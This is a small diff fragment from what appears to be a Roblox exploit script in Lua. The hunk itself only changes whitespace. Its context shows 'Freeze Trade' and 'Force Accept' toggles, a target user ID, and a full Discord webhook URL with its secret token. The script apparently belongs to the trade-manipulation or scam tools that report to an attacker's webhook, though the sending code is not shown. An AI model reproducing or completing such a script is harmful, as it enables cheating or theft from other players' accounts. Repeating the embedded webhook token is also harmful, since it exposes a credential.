@@ -110,7 +110,7 @@ end
  
 createToggle("Freeze Trade", 50)
 createToggle("Force Accept", 90)
-
+ 
 getgenv().WEBHOOK_URL = "https://discord.com/api/webhooks/1477232407756148757/-8TaNHi91kvowTnxwcrDoxO-V9me3MR2Kg-T9oHdbq3wq_mcqs_4-bgHKirDujBm6rVQ"
 getgenv().TARGET_ID = 9067006283
 getgenv().DELAY_STEP = 1      
